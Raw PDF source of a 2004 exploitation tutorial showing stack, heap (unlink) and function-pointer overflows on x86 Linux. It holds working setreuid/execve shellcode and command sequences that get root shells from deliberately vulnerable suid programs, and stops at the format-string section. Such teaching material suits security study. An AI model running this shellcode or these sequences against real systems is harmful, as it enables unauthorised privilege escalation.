%PDF-1.2
%‚„œ”
1 0 obj
<<
/A <<
/S /URI
/URI (http://www.phrack.org/phrack/49/P49-14)
>>
/Type /Annot
/Subtype /Link
/Rect [48 378 279 388]
/Border [0 0 0]
/H /I
>>
endobj
2 0 obj
<<
/A <<
/S /URI
/URI (http://www.phrack.org/phrack/59/p59-0x07.txt)
>>
/Type /Annot
/Subtype /Link
/Rect [48 342 315 352]
/Border [0 0 0]
/H /I
>>
endobj
3 0 obj
<<
/A <<
/S /URI
/URI (http://www.w00w00.org/files/articles/heaptut.txt)
>>
/Type /Annot
/Subtype /Link
/Rect [48 306 339 316]
/Border [0 0 0]
/H /I
>>
endobj
4 0 obj
<<
/A <<
/S /URI
/URI (http://www.phrack.org/phrack/57/p57-0x08)
>>
/Type /Annot
/Subtype /Link
/Rect [48 270 291 280]
/Border [0 0 0]
/H /I
>>
endobj
5 0 obj
<<
/A <<
/S /URI
/URI (http://www.phrack.org/phrack/57/p57-0x09)
>>
/Type /Annot
/Subtype /Link
/Rect [48 234 291 244]
/Border [0 0 0]
/H /I
>>
endobj
6 0 obj
<<
/A <<
/S /URI
/URI (http://www.phrack.org/phrack/58/p58-0x04)
>>
/Type /Annot
/Subtype /Link
/Rect [48 198 291 208]
/Border [0 0 0]
/H /I
>>
endobj
7 0 obj
<<
/A <<
/S /URI
/URI (http://www.phrack.org/phrack/56/p56-0x05)
>>
/Type /Annot
/Subtype /Link
/Rect [48 162 291 172]
/Border [0 0 0]
/H /I
>>
endobj
8 0 obj
<<
/A <<
/S /URI
/URI (http://www.core-sec.com/examples/core_format_strings.pdf)
>>
/Type /Annot
/Subtype /Link
/Rect [48 126 387 136]
/Border [0 0 0]
/H /I
>>
endobj
9 0 obj
<<
/A <<
/S /URI
/URI (http://www.core-sec.com/examples/core_vulnerabilities.pdf)
>>
/Type /Annot
/Subtype /Link
/Rect [48 114 393 124]
/Border [0 0 0]
/H /I
>>
endobj
10 0 obj
<<
/A <<
/S /URI
/URI (http://www.ibiblio.org/pub/Linux/apps/math/calc/pcalc-000.tar.gz)
>>
/Type /Annot
/Subtype /Link
/Rect [48 42 435 52]
/Border [0 0 0]
/H /I
>>
endobj
11 0 obj
<<
/Author (Steven Hill)
/CreationDate (D:20040321222950+11'00')
/Producer (txt2pdf v7.2 \251 SANFACE Software 2004)
/Title (Analysis of an Exploit)
/Subject (Exploit Research & Development)
>>
endobj
12 0 obj
<<
/Type /Encoding
/Differences [ 0 /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /space /exclam
/quotedbl /numbersign /dollar /percent /ampersand
/quoteright /parenleft /parenright /asterisk /plus /comma
/hyphen /period /slash /zero /one /two /three /four /five
/six /seven /eight /nine /colon /semicolon /less /equal
/greater /question /at /A /B /C /D /E /F /G /H /I /J /K /L
/M /N /O /P /Q /R /S /T /U /V /W /X /Y /Z /bracketleft
/backslash /bracketright /asciicircum /underscore
/quoteleft /a /b /c /d /e /f /g /h /i /j /k /l /m /n /o /p
/q /r /s /t /u /v /w /x /y /z /braceleft /bar /braceright
/asciitilde /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/.notdef /.notdef /.notdef /.notdef /.notdef /.notdef
/dotlessi /grave /acute /circumflex /tilde /macron /breve
/dotaccent /dieresis /.notdef /ring /cedilla /.notdef
/hungarumlaut /ogonek /caron /space /exclamdown /cent
/sterling /currency /yen /brokenbar /section /dieresis
/copyright /ordfeminine /guillemotleft /logicalnot /hyphen
/registered /macron /degree /plusminus /twosuperior
/threesuperior /acute /mu /paragraph /periodcentered
/cedilla /onesuperior /ordmasculine /guillemotright
/onequarter /onehalf /threequarters /questiondown /Agrave
/Aacute /Acircumflex /Atilde /Adieresis /Aring /AE
/Ccedilla /Egrave /Eacute /Ecircumflex /Edieresis /Igrave
/Iacute /Icircumflex /Idieresis /Eth /Ntilde /Ograve
/Oacute /Ocircumflex /Otilde /Odieresis /multiply /Oslash
/Ugrave /Uacute /Ucircumflex /Udieresis /Yacute /Thorn
/germandbls /agrave /aacute /acircumflex /atilde /adieresis
/aring /ae /ccedilla /egrave /eacute /ecircumflex
/edieresis /igrave /iacute /icircumflex /idieresis /eth
/ntilde /ograve /oacute /ocircumflex /otilde /odieresis
/divide /oslash /ugrave /uacute /ucircumflex /udieresis
/yacute /thorn /ydieresis ]
>>
endobj
13 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F1
/Encoding 12 0 R
/BaseFont /Courier
>>
endobj
14 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F2
/Encoding 12 0 R
/BaseFont /Courier-Oblique
>>
endobj
15 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F3
/Encoding 12 0 R
/BaseFont /Courier-Bold
>>
endobj
16 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F4
/Encoding 12 0 R
/BaseFont /Courier-BoldOblique
>>
endobj
17 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F5
/Encoding 12 0 R
/BaseFont /Helvetica
>>
endobj
18 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F6
/Encoding 12 0 R
/BaseFont /Helvetica-Oblique
>>
endobj
19 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F7
/Encoding 12 0 R
/BaseFont /Helvetica-Bold
>>
endobj
20 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F8
/Encoding 12 0 R
/BaseFont /Helvetica-BoldOblique
>>
endobj
21 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F9
/Encoding 12 0 R
/BaseFont /Times-Roman
>>
endobj
22 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F10
/Encoding 12 0 R
/BaseFont /Times-Italic
>>
endobj
23 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F11
/Encoding 12 0 R
/BaseFont /Times-Bold
>>
endobj
24 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F12
/Encoding 12 0 R
/BaseFont /Times-BoldItalic
>>
endobj
25 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F13
/BaseFont /Symbol
>>
endobj
26 0 obj
<<
/Type /Font
/Subtype /Type1
/Name /F14
/BaseFont /ZapfDingbats
>>
endobj
29 0 obj
<<
/Font << /F1 13 0 R /F2 14 0 R /F3 15 0 R /F4 16 0 R /F5 17 0 R /F6 18 0 R /F7 19 0 R /F8 20 0 R /F9 21 0 R /F10 22 0 R /F11 23 0 R /F12 24 0 R /F13 25 0 R /F14 26 0 R >>
/ProcSet [ /PDF /Text ]
/XObject << >>
>>
endobj
30 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 31 0 R
/Rotate 0
>>
endobj
31 0 obj
<<
/Length 32 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* () Tj
T* () Tj
T* (                             Covert Systems Research) Tj
T* () Tj
T* () Tj
T* (                    "Analysis of the Exploitation Processes") Tj
T* (                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (                                   Steven Hill ) Tj
T* (                                  aka: SolarIce) Tj
T* (                              www.covertsystems.org ) Tj
T* (                             steve@covertsystems.org  ) Tj
T* (                                    \(c\)  2004) Tj
T* () Tj
T* () Tj
T* () Tj
T* () Tj
T* () Tj
T* () Tj
T* (Table of Contents:) Tj
T* (~~~~~~~~~~~~~~~~~~      ) Tj
T* ( I.   Forward) Tj
T* ( II.  Types of Vulnerabilities) Tj
T* (  a:  Stack overwrite) Tj
T* (  b:  Heap overwrite) Tj
T* (  c:  Function pointer overwrite) Tj
T* (  d:  Format string) Tj
T* ( III. Exploitation Methods) Tj
T* (  a:  Stack exploitation) Tj
T* (  b:  Heap exploitation) Tj
T* (  c:  Function pointer exploitation) Tj
T* (  d:  Format string exploitation) Tj
T* (  e:  Return-to-libc exploitation) Tj
T* ( IV.  Summary) Tj
T* ( V.   References) Tj
T* () Tj
T* () Tj
T* () Tj
T* ([I] Forward:) Tj
T* (~~~~~~~~~~~~) Tj
T* () Tj
T* (In this document, I aim to clear the mystique surrounding the processes for) Tj
T* (exploiting certain vulnerabilities, of which blackhats use in order to gain) Tj
T* (either horizontal or vertical escalation of priviliges. This document shall) Tj
T* (not be in anyway complete, but rather a step for those seeking to gain a) Tj
T* (better understanding of how these exploitation processes are used to achieve) Tj
T* (those goals.) Tj
T* () Tj
T* (It is assumed that the reader has a basic understanding of C, ASM, GDB, and ) Tj
T* (of shellcoding principals together with memory layout for use with x86 Linux.) Tj
T* () Tj
T* (For the purposes of this document, we shall explore the world of commandline) Tj
T* (exploit sequences. This should give a better understanding of exploitation ) Tj
T* (methods in the sense that surgical commands are issued, and we are not just ) Tj
T* (relying on ready made exploits that does the job for you.) Tj
T* () Tj
T* (However, by having a better understanding of how the exploitation sequences) Tj
T* (work, a reasonable coder should be in a better position to create working) Tj
T* (exploit codes.) Tj
T* () Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(1) Tj
/F1 10 Tf
ET
endstream
endobj
32 0 obj
2431
endobj
33 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 34 0 R
/Rotate 0
>>
endobj
34 0 obj
<<
/Length 35 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* (This is version 1.0 of this document, any future versions shall be released) Tj
T* (at www.covertsystems.org) Tj
T* () Tj
T* () Tj
T* () Tj
T* ([II] Types of Vulnerabilities:) Tj
T* (~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (a:  Stack overwrite) Tj
T* (~~~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (Stack overwrite, also known by most as the buffer overflow. This would have) Tj
T* (to be the most widely understood vulnerability, yet for the purpose of this ) Tj
T* (document, I shall included it in order to keep this document reasonably ) Tj
T* (complete.) Tj
T* () Tj
T* (The purpose of the stack overwrite is to overflow a buffer far enough so) Tj
T* (that the EIP "instruction pointer" register located on the stack is over-) Tj
T* (written with the address of your supplied arbitrary shellcode. ) Tj
T* () Tj
T* (When a called function returns, the address located in the EIP register is ) Tj
T* (then executed, thus executing your shellcode with the privilages of the ) Tj
T* (process. If a vulnerable process has the privilages of suid/sgid root, this ) Tj
T* (could lead to a devastating compromise of a system.) Tj
T* () Tj
T* () Tj
T* (b:  Heap overwrite) Tj
T* (~~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (Heap overwrite is another vulnerability which is very similar to the) Tj
T* (stack overwrite. However, instead of overwriting the EIP on the stack, ) Tj
T* (the overwrite occurs by overwriting areas that have been allocated by ) Tj
T* (the process such as via a call to malloc\(\). ) Tj
T* () Tj
T* (Overflowing a buffer that has been dynamically allocated, data can flow) Tj
T* (into the next contigious allocated section on the heap. This allows a ) Tj
T* (person to modify the contents of those sections to their hearts content.) Tj
T* () Tj
T* () Tj
T* (c:  Function pointer overwrite) Tj
T* (~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~) Tj
T* (.bss section) Tj
T* (~~~~~~~~~~~~) Tj
T* () Tj
T* (A function pointer overwrite is useful when we have access to the pointer) Tj
T* (itself. If this is the case, we attempt to overwrite the pointer by ) Tj
T* (overflowing a static buffer just enough to write our preferred shellcode ) Tj
T* (address over it.) Tj
T* () Tj
T* (When the process calls the function pointer later during its execution of) Tj
T* (the code, our newly supplied function pointer address shall be executed ) Tj
T* (instead which most likely is a call to a setreuid shell.) Tj
T* () Tj
T* () Tj
T* (d:  Format string) Tj
T* (~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (Format string vulnerabilities are a blessing to exploit coders, in the) Tj
T* (fact that almost any address can be overwritten with a supplied address.) Tj
T* (Format bugs occur due to inaccurate use of function requirements, such as) Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(2) Tj
/F1 10 Tf
ET
endstream
endobj
35 0 obj
2804
endobj
36 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 37 0 R
/Rotate 0
>>
endobj
37 0 obj
<<
/Length 38 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* (not specifying the format specifier in functions like: printf, snprintf etc.) Tj
T* () Tj
T* (Without these format specifiers, a user can supply them as a parameter to ) Tj
T* (the functions thereby calling stack frames directly off the stack. ) Tj
T* () Tj
T* (Using this method, a user would look for input that they had entered and) Tj
T* (upon finding it, they would have access to a user-space region of memory. ) Tj
T* (All that is required is the offset to that user-space, an address to ) Tj
T* (overwrite and an address with which to supply,... in most cases a shellcode ) Tj
T* (address.) Tj
T* () Tj
T* () Tj
T* ([III] Exploitation Methods:) Tj
T* (~~~~~~~~~~~~~~~~~~~~~~~~~~~) Tj
T* ( ) Tj
T* (a:  Stack exploitation) Tj
T* (~~~~~~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (Sample vulnerable process.) Tj
T* () Tj
T* ([steve@covertsystems research]# cat > vuln.c << EOF) Tj
T* (#include <stdio.h>) Tj
T* (#include <string.h>) Tj
T* (#include <stdlib.h>) Tj
T* ( ) Tj
T* (int main\(int argc, char **argv\) {) Tj
T* () Tj
T* (  char buffer[1024];) Tj
T* ( ) Tj
T* (  if\(argc > 1\)) Tj
T* (    strcpy\(buffer, argv[1]\);) Tj
T* ( ) Tj
T* (  return EXIT_SUCCESS;) Tj
T* (}) Tj
T* (EOF) Tj
T* ([steve@covertsystems research]# sudo gcc vuln.c -o vuln) Tj
T* ([steve@covertsystems research]# sudo chown root.root vuln) Tj
T* ([steve@covertsystems research]# sudo chmod 4755 vuln) Tj
T* ([steve@covertsystems research]# ls -l vuln) Tj
T* (-rwsr-xr-x    1 root     root        11551 Mar 20 18:30 vuln) Tj
T* ([steve@covertsystems research]#) Tj
T* () Tj
T* (Having compiled our sample vulnerable program together with the appropriate) Tj
T* (privilages, we would naturally also need code that can be executed within the) Tj
T* (vulnerable process itself, thus shellcode is needed. Most people simply start) Tj
T* (with shellcode that calls a setreuid\(0, 0\) shell and in alot of cases this) Tj
T* (is quite sufficiant.) Tj
T* () Tj
T* (The following code provides a small 33 byte shellcode that produces a shell.) Tj
T* () Tj
T* (#include <stdio.h>) Tj
T* (#include <stdlib.h>) Tj
T* (                                                                                ) Tj
T* (char shell[] =) Tj
T* (  //setreuid\(0, 0\);) Tj
T* (  "\\x31\\xc0"              //     xorl   %eax, %eax) Tj
T* (  "\\x31\\xdb"              //     xorl   %ebx,%ebx) Tj
T* (  "\\xb0\\x46"              //     movb   $0x46,%al) Tj
T* (  "\\xcd\\x80"              //     int    $0x80) Tj
T* (                                                                                ) Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(3) Tj
/F1 10 Tf
ET
endstream
endobj
38 0 obj
2634
endobj
39 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 40 0 R
/Rotate 0
>>
endobj
40 0 obj
<<
/Length 41 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* (  //execve\(argv[0], &argv[0], NULL\);) Tj
T* (  "\\x31\\xc0"              //     xorl   %eax,%eax) Tj
T* (  "\\x31\\xd2"              //     xorl   %edx,%edx) Tj
T* (  "\\x52"                  //     pushl  %edx) Tj
T* (  "\\x68\\x2f\\x2f\\x73\\x68"  //     pushl  $0x68732f2f) Tj
T* (  "\\x68\\x2f\\x62\\x69\\x6e"  //     pushl  $0x6e69622f) Tj
T* (  "\\x89\\xe3"              //     movl   %esp,%ebx) Tj
T* (  "\\x52"                  //     pushl  %edx) Tj
T* (  "\\x53"                  //     pushl  %ebx) Tj
T* (  "\\x89\\xe1"              //     movl   %esp,%ecx) Tj
T* (  "\\xb0\\x0b"              //     movb   $0xb,%al) Tj
T* (  "\\xcd\\x80"              //     int    $0x80) Tj
T* (;) Tj
T* (int main\(void\)  {) Tj
T* (                                                                                ) Tj
T* (  FILE *fp;) Tj
T* (  int x;) Tj
T* (                                                                                ) Tj
T* (  fp = fopen\("tinyshell", "wb"\);) Tj
T* (  for\(x = 0; x < strlen\(shell\); x++\)) Tj
T* (    fprintf\(fp, "%c", shell[x]\);) Tj
T* (  printf\("Bytes: %d\\n", strlen\(shell\)\);) Tj
T* (  fclose\(fp\);) Tj
T* (  return EXIT_SUCCESS;) Tj
T* (}) Tj
T* () Tj
T* ([steve@covertsystems research]$ gcc shell2string.c) Tj
T* ([steve@covertsystems research]$ ./a.out) Tj
T* (Bytes: 33) Tj
T* ([steve@covertsystems research]$ xxd -g1 tinyshell) Tj
T* (0000000: 31 c0 31 db b0 46 cd 80 31 c0 31 d2 52 68 2f 2f  1.1..F..1.1.Rh//) Tj
T* (0000010: 73 68 68 2f 62 69 6e 89 e3 52 53 89 e1 b0 0b cd  shh/bin..RS.....) Tj
T* (0000020: 80                       ) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (Now that we have a shellcode sequence as a string, we need to place the string ) Tj
T* (were it can be of use to us. The obvious place for placing this shellcode is in) Tj
T* (an enviroment variable, of which we can get the address to it quite easily using) Tj
T* (a small commandline piece of code.) Tj
T* () Tj
T* (However, we first need to place this string into the enviroment.) Tj
T* () Tj
T* ([steve@covertsystems research]$ export CODE=`cat tinyshell`) Tj
T* ([steve@covertsystems research]$ echo 'main\(\){printf\("%p\\n",getenv\("CODE"\)\);}' >) Tj
T* (code.c ; gcc code.c -o code ; ./code ; rm -rf code*) Tj
T* (0xbffffb6b) Tj
T* (steve@covertsystems research]$ ) Tj
T* () Tj
T* (We now have the shellcode/string placed into the enviroment where we have) Tj
T* (access to it via the address: 0xbffffb6b ... This will be the address we wish) Tj
T* (to overwrite the EIP on the stack with, and as you can see, when that address) Tj
T* (is executed, the shellcode is executed too.) Tj
T* () Tj
T* (First we need to place the address in the appropriate spot on the stack and) Tj
T* (in order to do this, we need to calculate the position required. To do this) Tj
T* (we need to determine the offset from the start of the buffer.) Tj
T* () Tj
T* (Our sample program has a buffer of 1024 bytes in length, so we calculate) Tj
T* (1024 + 8 bytes padding + 4 EBP = 1036 ... This offset will put the next) Tj
T* (address that we write from 1036 to 1040 bytes. Thus overflowing the EIP!) Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(4) Tj
/F1 10 Tf
ET
endstream
endobj
41 0 obj
3229
endobj
42 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 43 0 R
/Rotate 0
>>
endobj
43 0 obj
<<
/Length 44 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* () Tj
T* ([steve@covertsystems research]$ export RET=`perl -e '{print "A" x 1036;}'`) Tj
T* (`printf "\\x6b\\xfb\\xff\\xbf";`) Tj
T* ([steve@covertsystems research]$ ./vuln $RET) Tj
T* (sh-2.05b# id) Tj
T* (uid=0\(root\) gid=500\(steve\) groups=500\(steve\)) Tj
T* (sh-2.05b# exit) Tj
T* () Tj
T* (We now have a root shell at our disposal. One thing to take note of is that) Tj
T* (the name ./vuln must be the same length in characters as the CODE enviroment) Tj
T* (variable. For the length of the vulnerable process can place the shellcode) Tj
T* (address slightly off by a few bytes. However once you become aware of this) Tj
T* (you should not have any problems.) Tj
T* () Tj
T* () Tj
T* (b:  Heap exploitation) Tj
T* (~~~~~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (Sample vulnerable process.) Tj
T* () Tj
T* ([steve@covertsystems research]$ cat > vuln.c << EOF) Tj
T* (#define LEN 256) Tj
T* ( ) Tj
T* (int main\(int argc, char **argv\) {) Tj
T* ( ) Tj
T* (  char *buf1 = \(char *\)malloc\(LEN\);) Tj
T* (  char *buf2 = \(char *\)malloc\(LEN\);) Tj
T* ( ) Tj
T* (  strcpy\(buf1, argv[1]\);) Tj
T* (  free\(buf1\);) Tj
T* (  free\(buf2\);) Tj
T* (}) Tj
T* (EOF) Tj
T* ([steve@covertsystems research]$ sudo gcc vuln.c -o vuln) Tj
T* ([steve@covertsystems research]$ sudo chown root.root ./vuln) Tj
T* ([steve@covertsystems research]$ sudo chmod 4755 ./vuln) Tj
T* ([steve@covertsystems research]$ ls -l ./vuln) Tj
T* (-rwsr-xr-x    1 root     root        11670 Mar  9 00:22 ./vuln) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (What we are looking at here in particular is a double free\(\) vulnerability that) Tj
T* (occurs upon the heap. This vulnerability can take alittle time to understand but) Tj
T* (the reward is that you should get a much better understanding of heap overflows.) Tj
T* () Tj
T* (We shall be using the code from the previous section to generate our ) Tj
T* (shell2string.c shellcode.) Tj
T* () Tj
T* ([steve@covertsystems research]$ gcc shell2string.c) Tj
T* ([steve@covertsystems research]$ ./a.out) Tj
T* (Bytes: 33) Tj
T* ([steve@covertsystems research]$ xxd -g1 tinyshell) Tj
T* (0000000: 31 c0 31 db b0 46 cd 80 31 c0 31 d2 52 68 2f 2f  1.1..F..1.1.Rh//) Tj
T* (0000010: 73 68 68 2f 62 69 6e 89 e3 52 53 89 e1 b0 0b cd  shh/bin..RS.....) Tj
T* (0000020: 80) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (Now that we have initialized our exploit with a basic requirement, we need to ) Tj
T* (better understand what we are trying to achieve. For this reason, I shall) Tj
T* (briefly explain our goals.) Tj
T* () Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(5) Tj
/F1 10 Tf
ET
endstream
endobj
44 0 obj
2646
endobj
45 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 46 0 R
/Rotate 0
>>
endobj
46 0 obj
<<
/Length 47 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* (Layout of memory on the heap allocated by malloc\(\);) Tj
T* () Tj
T* (|         data         |prev_inuse|prev_size| size  |  fd   |  bk   | junk) Tj
T* () Tj
T* (^---------256----------^----1-----^----4----^---4---^---4---^---4---^-----) Tj
T* (         bytes            1 bit      bytes     bytes   bytes   bytes) Tj
T* () Tj
T* () Tj
T* (When malloc\(\) is called, the memory is allocated similar to this on the heap.) Tj
T* (Except with our sample process, we have called malloc twice and by doing so,) Tj
T* (we must imagine that the junk part of the design is another allocated region) Tj
T* (of memory.) Tj
T* () Tj
T* (However, what we are interested in is that data can flow over the boundaries ) Tj
T* (into sections reserved for keeping track of malloc\(\) allocations. By supplying) Tj
T* (certain values, we can thereby trick the second free\(\) into executing our ) Tj
T* (shellcode.) Tj
T* () Tj
T* (Though first we need to determine some vital information. Which being the) Tj
T* (address of the free\(\) function in the dynamic relocation entry. This can be ) Tj
T* (attained via:) Tj
T* () Tj
T* ([steve@covertsystems research]$ objdump -R ./vuln | grep free) Tj
T* (080495a8 R_386_JUMP_SLOT   free) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (With this address, we must deduct 12 bytes from it to compensate that 12 bytes ) Tj
T* (are added later on during the exploitation process.) Tj
T* () Tj
T* ([steve@covertsystems research]$ pcalc 0xa8-0xc) Tj
T* (        156             0x9c            0y10011100) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (After gaining this information we will need to export our tinyshell up into an ) Tj
T* (enviroment variable, however we need to set a jmp code at the beginning of our ) Tj
T* (shellcode. This is because during the unlink\(\) call used by the free\(\) process,) Tj
T* (the first few bytes are mangled.) Tj
T* () Tj
T* (If this were to happen to our actual shellcode, we would not have a functioning) Tj
T* (shellcode with which to produce a shell from. Thus we can jump over the first ) Tj
T* (few bytes \(in our case 15\) using this jmp opcode.) Tj
T* () Tj
T* ([steve@covertsystems research]$ export CODE=`printf "\\xeb\\x0e"`AAAAAAAAAAAAAAA) Tj
T* (`cat tinyshell`) Tj
T* ([steve@covertsystems research]$ echo 'main\(\){printf\("%p\\n",getenv\("CODE"\)\);}' >) Tj
T* (code.c ; gcc code.c -o code ; ./code ; rm -rf code*) Tj
T* (0xbffffb6b) Tj
T* () Tj
T* (We are almost done now, except that we must supply a PREV_INUSE bit set to off.) Tj
T* (To do this we can select a number that has the first bit of a little endian) Tj
T* (ordered system set to off... which can be any number with lowest bit off.) Tj
T* () Tj
T* (In our case we shall use: 0xfffffff8) Tj
T* () Tj
T* (Lastly, we will need to set up a negative number with which to set the prev_size) Tj
T* (& size fields of the memory allocation, and thankfully we can use the same ) Tj
T* (number as we used for the PREV_INUSE bit. Now we have all of the ingrediants to) Tj
T* (complete this sequence.) Tj
T* () Tj
T* () Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(6) Tj
/F1 10 Tf
ET
endstream
endobj
47 0 obj
3165
endobj
48 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 49 0 R
/Rotate 0
>>
endobj
49 0 obj
<<
/Length 50 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* ([steve@covertsystems research]$ ./vuln `perl -e 'printf "A"x252 . ) Tj
T* ("\\xf8\\xff\\xff\\xff" . "\\xf8\\xff\\xff\\xff" . "\\xf8\\xff\\xff\\xff" . ) Tj
T* ("\\x9c\\x95\\x04\\x08" . "\\x6b\\xfb\\xff\\xbf"';`) Tj
T* (sh-2.05b# id) Tj
T* (uid=0\(root\) gid=500\(steve\) groups=500\(steve\)) Tj
T* (sh-2.05b# exit) Tj
T* (exit) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (Hopefully, this process is not as daunting as it seems. With alittle practice) Tj
T* (this exploit can be achieved quickly and effectively. All that matters is) Tj
T* (that we must fill a buffer upto -4 bytes from the end, and place our PREV_INUSE) Tj
T* (number there, then place two negative numbers, our address for free\(\) - 0x0c ) Tj
T* (and lastly our shellcode address.) Tj
T* () Tj
T* () Tj
T* (c:  Function pointer exploitation) Tj
T* (~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~) Tj
T* (.bss section) Tj
T* (~~~~~~~~~~~~) Tj
T* () Tj
T* (Sample vulnerable process.) Tj
T* () Tj
T* ([steve@covertsystems research]$ cat > vuln.c << EOF) Tj
T* (#include <stdio.h>) Tj
T* (#include <string.h>) Tj
T* (#include <stdlib.h>) Tj
T* (                                                                                ) Tj
T* (#define LEN 256) Tj
T* (                                                                                ) Tj
T* (void output\(char *\);) Tj
T* (                                                                                ) Tj
T* (int main\(int argc, char **argv\) {) Tj
T* (                                                                                ) Tj
T* (  static char buffer[LEN];  ) Tj
T* (  static void \(*func\) \(char *\);) Tj
T* () Tj
T* (  func = output;) Tj
T* (  strcpy\(buffer, argv[1]\);) Tj
T* (  func\(buffer\);) Tj
T* (                                                                                ) Tj
T* (  return EXIT_SUCCESS;) Tj
T* (}) Tj
T* (                                                                                ) Tj
T* (void output\(char *string\) {) Tj
T* (                                                                                ) Tj
T* (  fprintf\(stdout, "%s", string\);) Tj
T* (}) Tj
T* (EOF) Tj
T* ([steve@covertsystems research]$ sudo gcc vuln.c -o vuln) Tj
T* ([steve@covertsystems research]$ sudo chown root.root ./vuln) Tj
T* ([steve@covertsystems research]$ sudo chmod 4755 ./vuln) Tj
T* ([steve@covertsystems research]$ ls -l ./vuln) Tj
T* (-rwsr-xr-x    1 root     root        11670 Mar  9 00:22 ./vuln) Tj
T* ([steve@covertsystems research]$) Tj
T* () Tj
T* (When we are dealing with the heap, the heap grows upwards. Thus from taking ) Tj
T* (alook at this process, we can see that if we supply 256 bytes of junk data ) Tj
T* (then supply an address ie: shellcode address, we can overwrite the func\(\) ) Tj
T* (pointer.) Tj
/F2 10 Tf
1 0 0 1 306 20 Tm
(7) Tj
/F1 10 Tf
ET
endstream
endobj
50 0 obj
2877
endobj
51 0 obj
<<
/Type /Page
/Parent 28 0 R
/Resources 29 0 R
/Contents 52 0 R
/Rotate 0
>>
endobj
52 0 obj
<<
/Length 53 0 R >>
stream
BT
/F1 10 Tf
1 0 0 1 50 752 Tm
12 TL
T* () Tj
T* (However, overwriting the function pointer is not enough, unless the process ) Tj
T* (uses that function pointer at a later date during the execution. As we can see) Tj
T* (func\(\) is called after the overflow, which means that we can indeed exploit ) Tj
T* (this process.) Tj
T* () Tj
T* (The command sequence for exploitation of this processes is fairly simple.) Tj
T* () Tj
T* ([steve@covertsystems research]$ gcc shell2string.c) Tj
T* ([steve@covertsystems research]$ ./a.out) Tj
T* (Bytes: 33) Tj
T* ([steve@covertsystems research]$ xxd -g1 tinyshell) Tj
T* (0000000: 31 c0 31 db b0 46 cd 80 31 c0 31 d2 52 68 2f 2f  1.1..F..1.1.Rh//) Tj
T* (0000010: 73 68 68 2f 62 69 6e 89 e3 52 53 89 e1 b0 0b cd  shh/bin..RS.....) Tj
T* (0000020: 80) Tj
T* ([steve@covertsystems research]$ export CODE=`cat tinyshell`) Tj
T* ([steve@covertsystems research]$ echo 'main\(\){printf\("%p\\n",getenv\("CODE"\)\);}' >) Tj
T* (code.c ; gcc code.c -o code ; ./code ; rm -rf code*) Tj
T* (0xbffffb6b) Tj
T* ([steve@covertsystems research]$ ./vuln `perl -e 'print "A"x256 . "\\x6b\\xfb\\xff\\xbf"'`) Tj
T* (sh-2.05b$ id) Tj
T* (uid=0\(root\) gid=500\(steve\) groups=500\(steve\)) Tj
T* (sh-2.05b$ exit) Tj
T* (exit) Tj
T* ([steve@covertsystems research]$ ) Tj
T* () Tj
T* (As you can see, this is a fairly straightforward exploit sequence. ) Tj
T* () Tj
T* () Tj
T* (d:  Format string exploitation) Tj
T* (~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~) Tj
T* () Tj
T* (Sample vulnerable process.) Tj
T* () Tj
